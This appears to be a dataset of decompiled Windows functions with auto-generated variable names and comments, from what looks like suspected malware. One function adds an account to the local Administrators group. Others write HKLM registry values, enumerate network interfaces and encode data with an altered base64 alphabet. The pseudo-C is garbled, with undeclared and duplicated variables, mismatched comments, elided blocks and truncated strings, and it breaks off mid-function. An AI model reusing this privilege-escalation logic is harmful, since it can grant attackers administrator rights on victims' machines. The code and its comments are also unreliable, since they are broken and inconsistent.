{"Function Name": "FUN_140004460", "Address": "140004460", "Source Code": "\nvoid FUN_140004460(undefined8 *param_1)\n{\n    WCHAR new_wide_char_variable; // Declare a wide character variable named local_50\n    uint new_unsigned_int_array[2]; // Declare an array of two unsigned integers named local_58\n    undefined1 new_undefined_char_array[8]; // Declare an array of eight undefined characters named local_30\n    \n    new_wide_char_variable = L'\\0'; // Initialize local_50 to null character\n    FUN_140004720(&new_wide_char_variable); // Call function FUN_140004720 with address of local_50\n    \n    if (NetUserGetGroups(0, param_1, 0, &new_local_variable) == 0) { // If NetUserGetGroups is successful\n        if (new_unsigned_int_array[0] != 0) { // If local_58[0] is not zero\n            uint new_unsigned_var = 0; // Declare and initialize unsigned integer uVar9 to 0\n            do {\n                if (NetGroupGetInfo(0, *(undefined8 *)(new_local_variable + new_unsigned_var * 8), 3, &new_local_variable_2) == 0) { // If NetGroupGetInfo is successful\n                    // Code block removed for brevity\n                }\n                new_unsigned_var++; // Increment uVar9\n            } while (new_unsigned_var < new_unsigned_int_array[0]); // Repeat until uVar9 is less than local_58[0]\n            NetApiBufferFree(new_local_variable); // Free memory allocated by NetApiBuffer\n            \n            if (7 < param_1[3]) { // If param_1[3] is greater than 7\n                param_1 = (undefined8 *)*param_1; // Update param_1 to point to the value it is pointing to\n            }\n            if (NetUserGetInfo(0, param_1, 4, &new_local_variable_3) == 0) { // If NetUserGetInfo is successful\n                NetLocalGroupAddMember(0, &new_wide_char_variable, *(undefined8 *)(new_local_variable_3 + 0x98)); // Add local_50 to local group\n                NetApiBufferFree(new_local_variable_3); // Free memory allocated by NetApiBuffer\n            }\n        }\n    }\n    \n    if (7 < new_local_variable_4) { // If local_38 is greater than 7\n        if ((0xfff < new_local_variable_4 * 2 + 2) && (0x1f < (CONCAT62(new_variable_5, new_wide_char_variable) - *(longlong *)(CONCAT62(new_variable_5, new_wide_char_variable) + -8)) - 8U)) { // If conditions are met\n            FUN_14000ed18(); // Call function FUN_14000ed18\n        } else {\n            thunk_FUN_14000b460(); // Call function thunk_FUN_14000b460\n        }\n    }\n    \n    __security_check_cookie(new_local_variable_7 ^ (ulonglong)new_variable_6); // Perform security check\n}\n"}
{"Function Name": "FUN_140004720", "Address": "140004720", "Source Code": "\n// Function definition for FUN_140004720\nvoid FUN_140004720(LPWSTR new_param)\n{\n    BOOL new_boolean_var; // Boolean variable\n    DWORD new_dword_var; // DWORD variable\n    int new_int_var; // Integer variable\n    PSID new_sid_ptr; // Pointer to SID\n    DWORD new_dword_var_1; // DWORD variable\n    DWORD new_dword_var_2; // DWORD variable\n    DWORD new_dword_array[2]; // Array of DWORDs\n    WCHAR new_wchar_var; // WCHAR variable\n    ulonglong new_ulonglong_var_1; // Unsigned long long variable\n    ulonglong new_ulonglong_var_2; // Unsigned long long variable\n    SID_NAME_USE new_sid_name_use_array[2]; // Array of SID_NAME_USE\n\n    // Initialize local variables\n    new_dword_var_1 = 0;\n    \n    // Create well-known SID for Administrators group\n    new_boolean_var = CreateWellKnownSid(WinBuiltinAdministratorsSid, (PSID)0x0, (PSID)0x0, &new_dword_var_1);\n    \n    // Check if SID creation was successful or error code is 0x7a\n    if (((new_boolean_var != 0) || (new_dword_var = GetLastError(), new_dword_var == 0x7a)) &&\n        (new_int_var = NetApiBufferAllocate(new_dword_var_1, &new_sid_ptr), new_int_var == 0)) {\n        \n        // Create well-known SID for Administrators group with allocated buffer\n        new_boolean_var = CreateWellKnownSid(WinBuiltinAdministratorsSid, (PSID)0x0, new_sid_ptr, &new_dword_var_1);\n        \n        // Check if SID creation was successful\n        if (new_boolean_var != 0) {\n            // Lookup account SID information\n            new_dword_array[0] = 0;\n            new_dword_var_2 = 0;\n            new_boolean_var = LookupAccountSidW((LPCWSTR)0x0, new_sid_ptr, (LPWSTR)0x0, new_dword_array, (LPWSTR)0x0, &new_dword_var_2, new_sid_name_use_array);\n            \n            // Check if account lookup was successful or error code is 0x7a\n            if ((new_boolean_var != 0) || (new_dword_var = GetLastError(), new_dword_var == 0x7a)) {\n                // Process and manipulate strings based on conditions\n                // ...\n            }\n            // Free allocated buffer for SID\n            NetApiBufferFree(new_sid_ptr);\n        }\n    }\n    \n    // Security check and return\n    LAB_140004989:\n    __security_check_cookie(local_10 ^ (ulonglong)auStackY_98);\n    return;\n}\n"}
{"Function Name": "FUN_140005c80", "Address": "140005c80", "Source Code": "\n// Function to perform registry operations with the given parameters\nvoid FUN_140005c80(LPCWSTR new_param_1, LPCWSTR new_param_2, undefined4 param_3)\n{\n    LPCWSTR new_lpSubKey; // Variable to store the subkey\n    HKEY new_local_38; // Handle to the opened registry key\n    DWORD new_local_28; // Variable to store the result of registry operations\n    undefined4 new_local_30 = param_3; // Variable to store the parameter value\n\n    new_lpSubKey = new_param_1; // Initialize lpSubKey with param_1\n    if (7 < *(ulonglong *)(new_param_1 + 0xc)) { // Check if the length of param_1 is greater than 7\n        new_lpSubKey = *(LPCWSTR *)new_param_1; // Update lpSubKey if condition is met\n    }\n\n    // Open the registry key specified by lpSubKey\n    if (RegOpenKeyW((HKEY)0xffffffff80000002, new_lpSubKey, &new_local_38) == 2) {\n        if (7 < *(ulonglong *)(new_param_1 + 0xc)) { // Check if the length of param_1 is greater than 7\n            new_param_1 = *(LPCWSTR *)new_param_1; // Update param_1 if condition is met\n        }\n        // Create a new registry key if the specified key does not exist\n        RegCreateKeyExW((HKEY)0xffffffff80000002, new_param_1, 0, (LPWSTR)0x0, 0, 0xf003f, (LPSECURITY_ATTRIBUTES)0x0, &new_local_38, &new_local_28);\n    }\n\n    // Open the registry key specified by lpSubKey\n    if (RegOpenKeyW((HKEY)0xffffffff80000002, new_lpSubKey, &new_local_38) == 0) {\n        if (7 < *(ulonglong *)(new_param_2 + 0xc)) { // Check if the length of param_2 is greater than 7\n            new_param_2 = *(LPCWSTR *)new_param_2; // Update param_2 if condition is met\n        }\n        // Set a registry value under the opened key\n        RegSetKeyValueW(new_local_38, (LPCWSTR)0x0, new_param_2, 4, &new_local_30, 4);\n        RegCloseKey(new_local_38); // Close the opened registry key\n    }\n}\n"}
{"Function Name": "FUN_140005d80", "Address": "140005d80", "Source Code": "\n// Function definition for FUN_140005d80\nvoid FUN_140005d80(void)\n{\n    code *pointer_to_code; // Pointer to code\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    uint *pointer_to_unsigned_int; // Pointer to unsigned int\n    int integer_variable; // Integer variable\n    undefined8 *pointer_to_undefined_8_bytes; // Pointer to undefined 8 bytes\n    longlong *pointer_to_long_long; // Pointer to long long\n    uint unsigned_int_variable; // Unsigned int variable\n    undefined1 array_of_undefined_1_byte [32]; // Array of undefined 1 byte\n    longlong array_of_long_long [2]; // Array of long long\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    undefined4 undefined_4_bytes; // Undefined 4 bytes\n    undefined8 undefined_8_bytes; // Undefined 8 bytes\n    uint array_of_unsigned_int [2]; // Array of unsigned int\n    undefined8 array_of_undefined_8_bytes [2]; // Array of undefined 8 bytes\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    longlong array_of_long_long [2]; // Array of long long\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    uint *pointer_to_unsigned_int; // Pointer to unsigned int\n    undefined8 undefined_8_bytes; // Undefined 8 bytes\n    longlong long_long_variable; // Long long variable\n    undefined1 array_of_undefined_1_byte [512]; // Array of undefined 1 byte\n    uint unsigned_int_variable; // Unsigned int variable\n    uint unsigned_int_variable; // Unsigned int variable\n    byte array_of_bytes [332]; // Array of bytes\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n    ulonglong unsigned_long_long_variable; // Unsigned long long variable\n\n    undefined_8_bytes = 0xfffffffffffffffe;\n    unsigned_long_long_variable = DAT_140038080 ^ (ulonglong)array_of_undefined_1_byte;\n    unsigned_long_long_variable = 0;\n    undefined_4_bytes = 0;\n    array_of_unsigned_int[0] = 0;\n    integer_variable = GetIpAddrTable(0, array_of_unsigned_int, 0);\n    if (integer_variable == 0x7a) {\n        pointer_to_unsigned_int = (uint *)0x0;\n        undefined_8_bytes = 0;\n        long_long_variable = 0;\n        if ((ulonglong)array_of_unsigned_int[0] != 0) {\n            FUN_140008db0((longlong *)&pointer_to_unsigned_int, (ulonglong)array_of_unsigned_int[0]);\n        }\n        pointer_to_unsigned_int = pointer_to_unsigned_int;\n        integer_variable = GetIpAddrTable(pointer_to_unsigned_int, array_of_unsigned_int, 0);\n        if (integer_variable == 0) {\n            if (*pointer_to_unsigned_int != 0) {\n                do {\n                    unsigned_long_long_variable = 0;\n                    unsigned_long_long_variable = 0xf;\n                    array_of_undefined_8_bytes[0]._0_1_ = 0;\n                    FUN_140006170(array_of_undefined_8_bytes, pointer_to_unsigned_int[unsigned_long_long_variable * 6 + 1]);\n                    unsigned_long_long_variable = 0;\n                    unsigned_long_long_variable = 0xf;\n                    array_of_long_long[0]._0_1_ = 0;\n                    undefined_4_bytes = 1;\n                    if (0xf < unsigned_long_long_variable + 1) {\n                        FUN_140009060(array_of_long_long, unsigned_long_long_variable + 1);\n                    }\n                    unsigned_long_long_variable = 0;\n                    pointer_to_undefined_8_bytes = array_of_undefined_8_bytes;\n                    if (0xf < unsigned_long_long_variable) {\n                        pointer_to_undefined_8_bytes = (undefined8 *)CONCAT71(array_of_undefined_8_bytes[0]._1_7_, (undefined1)array_of_undefined_8_bytes[0]);\n                    }\n                    FUN_140007f20(array_of_long_long, pointer_to_undefined_8_bytes, unsigned_long_long_variable);\n                    FUN_140007f20(array_of_long_long, &DAT_14003176c, 1);\n                    pointer_to_long_long = array_of_long_long;\n                    if (0xf < unsigned_long_long_variable) {\n                        pointer_to_long_long = (longlong *)CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]);\n                    }\n                    FUN_140007f20(&DAT_140038b08, pointer_to_long_long, unsigned_long_long_variable);\n                    if (0xf < unsigned_long_long_variable) {\n                        if ((0xfff < unsigned_long_long_variable + 1) && (0x1f < (CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) - *(longlong *)(CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) + -8)) - 8U)) {\n                            thunk_FUN_14000b460();\n                        }\n                    }\n                    FUN_14000c740((undefined1 (*)[16])array_of_undefined_1_byte, 0, 0x35c);\n                    unsigned_int_variable = pointer_to_unsigned_int[unsigned_long_long_variable * 6 + 2];\n                    GetIfEntry(array_of_undefined_1_byte);\n                    unsigned_long_long_variable = 0;\n                    unsigned_long_long_variable = 0xf;\n                    array_of_long_long[0]._0_1_ = 0;\n                    FUN_1400064f0(array_of_long_long, array_of_bytes, unsigned_int_variable);\n                    unsigned_long_long_variable = unsigned_long_long_variable;\n                    unsigned_long_long_variable = 0;\n                    unsigned_long_long_variable = 0xf;\n                    array_of_long_long[0]._0_1_ = 0;\n                    undefined_4_bytes = 2;\n                    if (0xf < unsigned_long_long_variable + 2) {\n                        FUN_140009060(array_of_long_long, unsigned_long_long_variable + 2);\n                    }\n                    unsigned_long_long_variable = 0;\n                    pointer_to_long_long = array_of_long_long;\n                    if (0xf < unsigned_long_long_variable) {\n                        pointer_to_long_long = (longlong *)CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]);\n                    }\n                    FUN_140007f20(array_of_long_long, pointer_to_long_long, unsigned_long_long_variable);\n                    FUN_140007f20(array_of_long_long, &DAT_140031770, 2);\n                    pointer_to_long_long = array_of_long_long;\n                    if (0xf < unsigned_long_long_variable) {\n                        pointer_to_long_long = (longlong *)CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]);\n                    }\n                    FUN_140007f20(&DAT_140038b08, pointer_to_long_long, unsigned_long_long_variable);\n                    if (0xf < unsigned_long_long_variable) {\n                        if ((0xfff < unsigned_long_long_variable + 1) && (0x1f < (CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) - *(longlong *)(CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) + -8)) - 8U)) {\n                            thunk_FUN_14000b460();\n                        }\n                    }\n                    if (0xf < unsigned_long_long_variable) {\n                        if ((0xfff < unsigned_long_long_variable + 1) && (0x1f < (CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) - *(longlong *)(CONCAT71(array_of_long_long[0]._1_7_, (undefined1)array_of_long_long[0]) + -8)) - 8U)) {\n                            thunk_FUN_14000b460();\n                        }\n                    }\n                    if (0xf < unsigned_long_long_variable) {\n                        if ((0xfff < unsigned_long_long_variable + 1) && (0x1f < (CONCAT71(array_of_undefined_8_bytes[0]._1_7_, (undefined1)array_of_undefined_8_bytes[0]) - *(longlong *)(CONCAT71(array_of_undefined_8_bytes[0]._1_7_, (undefined1)array_of_undefined_8_bytes[0]) + -8)) - 8U)) {\n                            FUN_14000ed18();\n                            goto LAB_140006158;\n                        }\n                        thunk_FUN_14000b460();\n                    }\n                    unsigned_int_variable = (int)unsigned_long_long_variable + 1;\n                    unsigned_long_long_variable = (ulonglong)unsigned_int_variable;\n                } while (unsigned_int_variable < *pointer_to_unsigned_int);\n            }\n        }\n        else {\n            FUN_140002b60(9, integer_variable);\n        }\n        if (pointer_to_unsigned_int != (uint *)0x0) {\n            if ((0xfff < (ulonglong)(long_long_variable - (longlong)pointer_to_unsigned_int)) && (0x1f < (ulonglong)((longlong)pointer_to_unsigned_int + (-8 - *(longlong *)(pointer_to_unsigned_int + -2)))) {\n                LAB_140006158:\n                FUN_14000ed18();\n                goto LAB_14000615e;\n            }\n            thunk_FUN_14000b460();\n        }\n    }\n    else {\n        FUN_140002b60(9, integer_variable);\n    }\n    __security_check_cookie(unsigned_long_long_variable ^ (ulonglong)array_of_undefined_1_byte);\n    return;\n}\n"}
{"Function Name": "FUN_140006170", "Address": "140006170", "Source Code": "\n// Function to format and print a hexadecimal number\nvoid FUN_140006170(undefined8 *param_1, uint param_2)\n{\n    ulonglong newVar1;\n    longlong *newVar2;\n    ulonglong newVar3;\n    char *newVar4;\n    byte newVar5;\n    byte newVar6;\n    byte newVar7;\n    undefined1 newVar8[32];\n    longlong newVar9[2];\n    ulonglong newVar10;\n    ulonglong newVar11;\n\n    // Initialize local variables\n    local_38 = 0xfffffffffffffffe;\n    local_18 = DAT_140038080 ^ (ulonglong)newVar8;\n\n    // Process the first byte of the input parameter\n    newVar4 = local_1c + 1;\n    newVar3 = (ulonglong)(byte)param_2;\n    do {\n        newVar4 = newVar4 + -1;\n        newVar1 = newVar3 / 10;\n        newVar9[0]._0_1_ = (char)newVar1;\n        *newVar4 = (char)newVar3 + (char)newVar9[0] * -10 + '0';\n        newVar3 = newVar1;\n    } while ((int)newVar1 != 0);\n\n    // Process and print the formatted number\n    newVar10 = _DAT_140032a30;\n    newVar11 = _UNK_140032a38;\n    if (newVar4 != local_1c + 1) {\n        FUN_140007dc0(newVar9, (undefined8 *)newVar4, (ulonglong)(local_1c + (1 - (longlong)newVar4)));\n    }\n    newVar2 = newVar9;\n    if (0xf < newVar11) {\n        newVar2 = (longlong *)CONCAT71(newVar9[0]._1_7_, (char)newVar9[0]);\n    }\n    FUN_140007f20(param_1, newVar2, newVar10);\n\n    // Check conditions and execute corresponding functions\n    if (0xf < newVar11) {\n        if ((0xfff < newVar11 + 1) &&\n            (0x1f < (CONCAT71(newVar9[0]._1_7_, (char)newVar9[0]) -\n                    *(longlong *)(CONCAT71(newVar9[0]._1_7_, (char)newVar9[0]) + -8)) - 8U))\n            goto LAB_1400064e3;\n        thunk_FUN_14000b460();\n    }\n\n    // Process and print the formatted number for the next byte of the input parameter\n    FUN_140007f20(param_1, &DAT_140031774, 1);\n    newVar5 = (byte)(param_2 >> 8);\n    newVar4 = local_1c + 1;\n    newVar3 = (ulonglong)newVar5;\n    do {\n        newVar4 = newVar4 + -1;\n        newVar1 = newVar3 / 10;\n        newVar9[0]._0_1_ = (char)newVar1;\n        *newVar4 = (char)newVar3 + (char)newVar9[0] * -10 + '0';\n        newVar3 = newVar1;\n    } while ((int)newVar1 != 0);\n\n    // Repeat the process for the remaining bytes of the input parameter\n    // ...\n\n    // Check conditions and execute corresponding functions\n    if (0xf < newVar11) {\n        if ((0xfff < newVar11 + 1) &&\n            (0x1f < (CONCAT71(newVar9[0]._1_7_, (char)newVar9[0]) -\n                    *(longlong *)(CONCAT71(newVar9[0]._1_7_, (char)newVar9[0]) + -8)) - 8U))\n            goto LAB_1400064e3;\n        thunk_FUN_14000b460();\n    }\n\n    // Perform security check and return\n    __security_check_cookie(local_18 ^ (ulonglong)newVar8);\n    return;\n}\n"}
{"Function Name": "FUN_1400064f0", "Address": "1400064f0", "Source Code": "\n// Function definition for FUN_1400064f0\nvoid FUN_1400064f0(longlong *ptr_param, byte *ptr_data, uint num_iterations)\n{\n    uint counter;\n    ulonglong temp_var;\n    undefined1 stack_array [32];\n    undefined4 var_1;\n    undefined1 var_2;\n    longlong temp_stack_var;\n    longlong var_3;\n    ulonglong var_4;\n    longlong array_1 [2];\n    longlong array_2 [4];\n    ulonglong var_5;\n    ulonglong var_6;\n\n    // Initialize local variables\n    init_val = 0xfffffffffffffffe;\n    xor_val = DAT_140038080 ^ (ulonglong)stack_array;\n    counter = 0;\n    var_1 = 0;\n\n    // Call functions\n    FUN_14000c740((undefined1 (*) [16])array_1, 0, 0xf8);\n    FUN_140006ec0(array_1);\n\n    // Loop through param_3 times\n    if (num_iterations != 0) {\n        do {\n            if (counter != 0) {\n                FUN_140008330(array_2);\n            }\n            FUN_140002710((longlong)array_2 + (longlong)*(int *)(array_2[0] + 4));\n            ptr_var = FUN_140009c8c((undefined8 *)&var_2, 2);\n            (*(code *)*ptr_var)((longlong)array_2 + (longlong)*(int *)(array_2[0] + 4), ptr_var[1]);\n            *(undefined1 *)((longlong)array_3 + (longlong)*(int *)(array_2[0] + 4)) = 0x30;\n            FUN_140008b60(array_2, *ptr_data);\n            counter = counter + 1;\n            ptr_data = ptr_data + 1;\n        } while (counter < num_iterations);\n    }\n\n    // More function calls and conditions\n    var_3 = _DAT_140032a30;\n    var_4 = _UNK_140032a38;\n    var_2 = 0;\n    var_1 = 2;\n    if (((var_6 & 2) == 0) && (temp_var = *ptr_var_2, temp_var != 0)) {\n        ptr_var = (undefined8 *)*ptr_var_3;\n        if (temp_var < var_5) {\n            temp_var = var_5;\n        }\n        temp_var = temp_var - (longlong)ptr_var;\n        LAB_14000662f:\n        FUN_140007dc0((longlong *)&var_2, ptr_var, temp_var);\n    }\n    else if (((var_6 & 4) == 0) && (*ptr_var_4 != 0)) {\n        ptr_var = (undefined8 *)*ptr_var_5;\n        temp_var = ((longlong)*array_3[0] - (longlong)ptr_var) + *ptr_var_4;\n        goto LAB_14000662f;\n    }\n\n    // Conditions and function calls\n    if (ptr_param == (longlong *)&var_2) {\n        if (0xf < var_4) {\n            if ((0xfff < var_4 + 1) && (0x1f < (CONCAT71(uStack_14f, var_2) - *(longlong *)(CONCAT71(uStack_14f, var_2) + -8)) - 8U)) goto LAB_1400066f9;\n            thunk_FUN_14000b460();\n        }\n    }\n    else {\n        if (0xf < (ulonglong)ptr_param[3]) {\n            if ((0xfff < ptr_param[3] + 1U) && (0x1f < (*ptr_param - *(longlong *)(*ptr_param + -8)) - 8U)) {\n                LAB_1400066f9:\n                FUN_14000ed18();\n                pcVar1 = (code *)swi(3);\n                (*pcVar1)();\n                return;\n            }\n            thunk_FUN_14000b460();\n        }\n        *ptr_param = CONCAT71(uStack_14f, var_2);\n        ptr_param[1] = temp_stack_var;\n        ptr_param[2] = var_3;\n        ptr_param[3] = var_4;\n    }\n\n    // Clean up and return\n    FUN_140006700(array_1);\n    __security_check_cookie(xor_val ^ (ulonglong)stack_array);\n    return;\n}\n"}
{"Function Name": "FUN_140006700", "Address": "140006700", "Source Code": "\n// Function definition for FUN_140006700\nvoid function_140006700(longlong *parameter_1)\n{\n    // Initialize piVar1 as ios_base pointer\n    ios_base *ios_base_pointer = (ios_base *)(parameter_1 + 0x13);\n    \n    // Set vftable for basic_stringstream\n    *(undefined ***)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x98) = std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n    // Set offset for basic_stringstream\n    *(int *)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x9c) = *(int *)(*parameter_1 + 4) + -0x98;\n    \n    // Call function FUN_140007580 with param_1 + 3\n    FUN_140007580(parameter_1 + 3);\n    \n    // Set vftable for basic_iostream\n    *(undefined ***)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x98) = std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;\n    // Set offset for basic_iostream\n    *(int *)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x9c) = *(int *)(*parameter_1 + 4) + -0x20;\n    \n    // Set vftable for basic_ostream\n    *(undefined ***)(ios_base_pointer + (longlong)*(int *)(parameter_1[2] + 4) + -0x88) = std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n    // Set offset for basic_ostream\n    *(int *)(ios_base_pointer + (longlong)*(int *)(parameter_1[2] + 4) + -0x8c) = *(int *)(parameter_1[2] + 4) + -0x10;\n    \n    // Set vftable for basic_istream\n    *(undefined ***)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x98) = std::basic_istream<char,struct_std::char_traits<char>_>::vftable;\n    // Set offset for basic_istream\n    *(int *)(ios_base_pointer + (longlong)*(int *)(*parameter_1 + 4) + -0x9c) = *(int *)(*parameter_1 + 4) + -0x18;\n    \n    // Set vftable for ios_base and call _Ios_base_dtor\n    *(undefined ***)ios_base_pointer = std::ios_base::vftable;\n    std::ios_base::_Ios_base_dtor(ios_base_pointer);\n    \n    return;\n}\n"}
{"Function Name": "FUN_140006810", "Address": "140006810", "Source Code": "\n// Function definition taking three parameters\nundefined8 FUN_140006810(undefined8 *param_1, longlong param_2, ulonglong param_3)\n{\n    ulonglong newVar1; // Variable declaration\n    int newVar2; // Variable declaration\n    ulonglong newVar4; // Variable declaration\n    ulonglong newVar5; // Variable declaration\n    ulonglong newVar6; // Variable declaration\n    ulonglong newVar7; // Variable declaration\n    longlong newVar8; // Variable declaration\n    byte *newVar9; // Variable declaration\n    ulonglong newVar10; // Variable declaration\n    uint newVar11; // Variable declaration\n    wchar_t *newVar12; // Variable declaration\n    int newVar13; // Variable declaration\n    ulonglong newVar14; // Variable declaration\n    byte newStackArray [16]; // Array declaration\n    ulonglong newVar3; // Variable declaration\n    \n    // Assigning values to variables\n    newVar9 = (byte *)*param_1;\n    newVar10 = (longlong)param_1[1] - (longlong)newVar9;\n    \n    // Checking condition\n    if ((param_3 & 0xffffffff) < ((newVar10 - 1) / 3) * 4 + 5) {\n        return 0; // Return statement\n    }\n    \n    newVar14 = 0; // Variable initialization\n    newVar2 = 0; // Variable initialization\n    newVar13 = 0; // Variable initialization\n    \n    // Checking condition\n    if ((byte *)param_1[1] < newVar9) {\n        newVar10 = newVar14; // Variable assignment\n    }\n    \n    // Checking condition\n    if (newVar10 == 0) {\n        newVar6 = (ulonglong)newStackArray[2];\n        newVar4 = (ulonglong)newStackArray[1];\n        newVar11 = (uint)newStackArray[0];\n    }\n    else {\n        newVar12 = (wchar_t *)(param_2 + 4);\n        newVar1 = newVar14;\n        newVar3 = newVar14;\n        newVar5 = newVar14;\n        newVar7 = newVar14;\n        \n        // Loop\n        do {\n            newStackArray[newVar1] = *newVar9;\n            newVar1 = newVar1 + 1;\n            newVar6 = (ulonglong)newStackArray[2];\n            newVar4 = (ulonglong)newStackArray[1];\n            newVar11 = (uint)newStackArray[0];\n            newVar3 = (ulonglong)((int)newVar3 + 1);\n            \n            // Checking condition\n            if (newVar1 == 3) {\n                newVar5 = (ulonglong)((int)newVar5 + 4);\n                newVar12[-2] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[newStackArray[0] >> 2];\n                newVar12[-1] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[(ulonglong)((newVar11 & 3) << 4) | (ulonglong)(newStackArray[1] >> 4)];\n                *newVar12 = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[(ulonglong)((newStackArray[1] & 0xf) << 2) | (ulonglong)(newStackArray[2] >> 6)];\n                newVar12[1] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[newStackArray[2] & 0x3f];\n                newVar12 = newVar12 + 4;\n                newVar1 = newVar14;\n                newVar3 = newVar14;\n            }\n            \n            newVar2 = (int)newVar3;\n            newVar13 = (int)newVar5;\n            newVar9 = newVar9 + 1;\n            newVar7 = newVar7 + 1;\n        } while (newVar7 != newVar10);\n        \n        // Checking condition\n        if (newVar2 != 0) {\n            newVar8 = (longlong)newVar13;\n            goto LAB_14000695b;\n        }\n    }\n    \n    newVar8 = (longlong)newVar13;\n    *(undefined2 *)(param_2 + newVar8 * 2) = 0;\n    \nLAB_14000695b:\n    \n    // Checking conditions and performing assignments\n    if (newVar2 == 1) {\n        *(undefined4 *)(param_2 + 4 + newVar8 * 2) = 0x3d003d;\n        *(undefined2 *)(param_2 + 8 + newVar8 * 2) = 0;\n        *(wchar_t *)(param_2 + newVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[newVar11 >> 2];\n        *(wchar_t *)(param_2 + 2 + newVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[(ulonglong)((newVar11 & 3) << 4) | newVar4 >> 4];\n    }\n    else if (newVar2 == 2) {\n        *(undefined4 *)(param_2 + 6 + newVar8 * 2) = 0x3d;\n        *(wchar_t *)(param_2 + newVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[newVar11 >> 2];\n        *(wchar_t *)(param_2 + 2 + newVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[(ulonglong)((newVar11 & 3) << 4) | newVar4 >> 4];\n        *(wchar_t *)(param_2 + 4 + newVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+\"[(ulonglong)(((uint)newVar4 & 0xf) << 2) | newVar6 >> 6];\n    }\n    \n    return 1; // Return statement\n}\n"}
{"Function Name": "FUN_140006857", "Address": "140006857", "Source Code": "\n// Function definition for FUN_140006857\nundefined8 FUN_140006857(void)\n{\n    ulonglong new_uVar1; // Variable to store ulonglong value\n    int new_iVar2 = 0; // Variable to store integer value\n    ulonglong new_uVar4 = 0; // Variable to store ulonglong value\n    ulonglong new_uVar5 = 0; // Variable to store ulonglong value\n    ulonglong new_uVar6 = 0; // Variable to store ulonglong value\n    longlong new_unaff_RDI; // Variable to store longlong value\n    ulonglong new_uVar7 = 0; // Variable to store ulonglong value\n    longlong new_lVar8; // Variable to store longlong value\n    undefined1 *new_in_R9; // Pointer to undefined1 type\n    ulonglong new_in_R10; // Variable to store ulonglong value\n    uint new_uVar9; // Variable to store uint value\n    undefined1 *new_in_R11; // Pointer to undefined1 type\n    wchar_t *new_pwVar10; // Pointer to wchar_t type\n    int new_iVar11 = 0; // Variable to store integer value\n    ulonglong new_uVar12 = 0; // Variable to store ulonglong value\n    \n    // Check if in_R11 is less than in_R9\n    if (new_in_R11 < new_in_R9) {\n        new_in_R10 = 0; // Set in_R10 to 0\n    }\n    \n    // Check if in_R10 is equal to 0\n    if (new_in_R10 == 0) {\n        new_uVar6 = (ulonglong)in_stack_00000042;\n        new_uVar4 = (ulonglong)in_stack_00000041;\n        new_uVar9 = (uint)in_stack_00000040;\n    }\n    else {\n        new_pwVar10 = (wchar_t *)(new_unaff_RDI + 4); // Set pwVar10 to unaff_RDI + 4\n        new_uVar1 = 0;\n        new_uVar5 = 0;\n        new_uVar7 = 0;\n        \n        // Loop to process data\n        do {\n            (&stack0x00000040)[new_uVar1] = *new_in_R9;\n            new_uVar1++;\n            new_uVar6 = (ulonglong)in_stack_00000042;\n            new_uVar4 = (ulonglong)in_stack_00000041;\n            new_uVar9 = (uint)in_stack_00000040;\n            new_uVar5++;\n            if (new_uVar1 == 3) {\n                new_pwVar10[-2] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[in_stack_00000040 >> 2];\n                new_pwVar10[-1] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[((new_uVar9 & 3) << 4) | (in_stack_00000041 >> 4)];\n                *new_pwVar10 = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[((in_stack_00000041 & 0xf) << 2) | (in_stack_00000042 >> 6)];\n                new_pwVar10[1] = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[in_stack_00000042 & 0x3f];\n                new_pwVar10 += 4;\n                new_uVar1 = 0;\n                new_uVar5 = 0;\n            }\n            new_iVar2 = (int)new_uVar5;\n            new_iVar11 = (int)new_uVar1;\n            new_in_R9++;\n            new_uVar7++;\n        } while (new_uVar7 != new_in_R10);\n        \n        // Check if iVar2 